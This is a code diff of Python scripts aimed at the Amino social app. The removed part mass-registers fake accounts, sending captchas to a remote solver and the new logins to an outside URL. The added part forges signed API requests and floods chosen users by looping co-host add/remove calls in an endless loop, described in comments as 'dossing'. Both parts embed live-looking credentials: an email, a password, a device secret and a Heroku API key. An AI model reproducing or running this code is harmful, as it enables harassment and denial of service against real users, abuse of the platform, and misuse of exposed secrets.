@@ -1,56 +1,210 @@
-import amino
-import os
-import names
-import json
-import threading
-import requests
-import wget
-import heroku3
-key="7ad5b9cf-7c8c-4ff5-a016-6186e636d3b7"
-nickname="Charlie"
-app_name="acc1222"
-url="https://samar.thehybridklaus.repl.co"
-password="samar123"
-def restart():
-    heroku_conn = heroku3.from_key(key)
-    botapp= heroku_conn.apps()[app_name]
-    botapp.restart()
-def send(data):
-    requests.post(f"{url}/save",data=data)
-client=amino.Client("17925AEBB52F0AB6309A4D963914DD5ABBA536CE2ACC53643300942EF82983B504AF220835D92B95DB")
+from concurrent.futures import ThreadPoolExecutor
+from requests import get
+from hashlib import sha1
+from os import path
+import json, time
+import aiohttp
+import asyncio 
+import base64
+import hmac
 
-def codee(link):
-	d={"data":link}
-	p=requests.post("http://192.46.210.24:5000/captcha",data=d)
-	return p.json()["dick"]
+THIS_FOLDER = path.dirname(path.abspath(__file__))
+targets = path.join(THIS_FOLDER, 'Target.txt')
+with open(targets, 'r') as file:
+    targetlinks = file.read().splitlines()
 
-#password=custompwd
+class FromLink:
+    def __init__(self, data):
+        self.json = data
+        self.objectType = None
 
-for i in range(3):
-  dev=client.devicee()
-  nick=names.get_full_name()
-  #dev=client.device_id
-  email=client.gen_email()
-  print(email)
-  client.request_verify_code(email = email,dev=dev)
-  link=client.get_message(email)
-  try: code=codee(link)
-  except: pass
-  
-  
-  try:
-    client.register(email = email,password = password,nickname =nick, verificationCode = code,deviceId=dev)
-    #sub.send_message(chatId=chatId,message="Criada")
-    d={}
-    d["email"]=str(email)
-    d["password"]=str(password)
-    d["device"]=str(dev)
-    t=json.dumps(d)
-    data={"data":t}
-    send(data)
-  except Exception as l:
-    print(l)
-    pass
+        self.objectId = None
+        self.comId = None
+
+    @property
+    def FromCode(self):
+        try:
+            self.path = self.json["path"]
+        except (KeyError, TypeError):
+            pass
+        try:
+            self.objectType = self.json["extensions"]["linkInfo"]["objectType"]
+        except (KeyError, TypeError):
+            pass
+        try:
+            self.objectId = self.json["extensions"]["linkInfo"]["objectId"]
+        except (KeyError, TypeError):
+            pass
+        try:
+            self.comId = self.json["extensions"]["community"]["ndcId"]
+        except (KeyError, TypeError):
+            try:
+                self.comId = self.json["extensions"]["linkInfo"]["ndcId"]
+            except (KeyError, TypeError):
+                pass
+        return self
 
 
-restart()
+class Account():
+    def __init__(self, accountline, session):
+        self.authenticated = False
+        self.email = accountline["email"]
+        self.password = accountline["password"]
+        self.device_id = accountline["device"]
+        self.session = session
+        self.target_user = []
+        self.hostgc = None
+        self.cid = None
+        self.sid = None
+        self.uid = None
+        self.api = 'https://service.narvii.com/api/v1'
+
+    async def generate_headers(self, data=None, content_type=None, sig=None):
+        headers = {
+            'NDCDEVICEID': self.device_id,
+            'Accept-Language': 'en-US',
+            'Content-Type': 'text/html',
+            'User-Agent':
+            'Dalvik/2.1.0 (Linux; U; Android 7.1.2; SM-G965N Build/star2ltexx-user 7.1.; com.narvii.amino.master/3.4.33602)',
+            'Host': 'service.narvii.com',
+            'Accept-Encoding': 'gzip',
+            'Connection': 'Keep-Alive'
+        }
+        if data:
+            headers['content_type-Length'] = str(len(data))
+            if sig:
+                headers['NDC-MSG-SIG'] = sig
+        if self.sid:
+            headers['NDCAUTH'] = f'sid={self.sid}'
+        if content_type:
+            headers["Content-Type"] = content_type
+        return headers
+
+    async def sig(self, data):
+        signature = base64.b64encode(
+            bytes.fromhex("52") +
+            hmac.new(bytes.fromhex("EAB4F1B9E3340CD1631EDE3B587CC3EBEDF1AFA9"),
+                     data.encode("utf-8"), sha1).digest()).decode("utf-8")
+        return signature
+
+    async def login(self):
+        data = json.dumps({
+            'email': self.email,
+            'v': 2,
+            'secret': f'0 {self.password}',
+            'deviceID': self.device_id,
+            'clientType': 100,
+            'action': 'normal',
+            'timestamp': int(time.time() * 1000)
+        })
+        async with self.session.post(f'{self.api}/g/s/auth/login',
+                                     headers=await
+                                     self.generate_headers(data=data,
+                                                           sig=await
+                                                           self.sig(data)),
+                                     data=data) as response:
+            response = await response.json()
+            if response["api:statuscode"] == 0:
+                pass
+            else:
+                raise Exception(response['api:message'])
+            self.sid = response["sid"]
+            self.uid = response["account"]["uid"]
+            self.authenticated = True
+
+    async def from_link(self, link):
+        response = get(f"{self.api}/g/s/link-resolution?q={link}",
+                       headers=await self.generate_headers()).json()
+        if response["api:statuscode"] == 0:
+            pass
+        else:
+            raise Exception(response['api:message'])
+        x = FromLink(response["linkInfoV2"]).FromCode
+        if x.objectType == 12:
+            self.cid = x.comId
+            self.hostgc = x.objectId
+        else:
+            self.target_user.append(x.objectId)
+
+    async def set(self, uid):
+        data = json.dumps({
+            "uidList": [uid],
+            "timestamp": int(time.time() * 1000)
+        })
+        async with self.session.post(
+                f"{self.api}/x{self.cid}/s/chat/thread/{self.hostgc}/co-host",
+                data=data,
+                headers=await
+                self.generate_headers(data=data, sig=await
+                                      self.sig(data))) as _:
+            #response = await response.json()
+            #print(response)
+            #print(f"dossing {uid}")
+            pass
+            #if response["api:statuscode"] == 0:
+                 #pass
+            #else:
+                 #raise Exception(response["api:message"])
+
+    async def dele(self, uid):
+        async with self.session.delete(
+                f"{self.api}/x{self.cid}/s/chat/thread/{self.hostgc}/co-host/{uid}",
+                headers=await self.generate_headers()) as _:
+            #response = await response.json()
+            #print(response)
+            #(f"dossing {uid}")
+            pass
+            #if response["api:statuscode"] == 0:
+                 #pass
+            #else:
+                 #raise Exception(response["api:message"])
+
+    async def crash(self, uid):
+        try:
+            await self.set(uid)
+            await self.dele(uid)
+            print(f"Spamming {uid}")
+        except Exception as e:
+            print(f"error {e}")
+
+
+async def itachi(acc: Account):
+    crowd = []
+    xo = len(acc.target_user)
+    # for _ in range(10):
+    with ThreadPoolExecutor(max_workers= 50000) as exe:
+        _ = [
+            exe.submit(
+                crowd.append(
+                    asyncio.create_task(acc.crash(acc.target_user[i % xo]))))
+            for i in range(100)
+        ]
+    await asyncio.gather(*crowd)
+
+
+async def main():
+    
+    email="Onlyyoursmerijaan@gmail.com" # enter email here
+    password="AdiShakti123" # enter password here
+    device="19BAB42A8DDF8E50FF085D32C10B15D0B8F5F17EA021584C0ADA22127942C389C61EBEB33B31D254D1" # enter secret here
+    gclink="http://aminoapps.com/p/tc40pk"  # enter gc link where you are set as host
+    logdata = {"email": email, "password": password, "device": device}
+    async with aiohttp.ClientSession() as session:
+        client = Account(logdata, session)
+        await client.login()
+        await client.from_link(gclink)
+        total = []
+        for targetlink in targetlinks:
+            total.append(asyncio.create_task(client.from_link(targetlink)))
+        await asyncio.gather(*total)
+        while True:
+             task = []
+             print(task)
+             await itachi(client)
+             for _ in range(100):
+                 for uid in client.target_user:
+                     task.append(asyncio.create_task(client.crash(uid)))
+             await asyncio.gather(*task)
+
+
+asyncio.get_event_loop().run_until_complete(main())
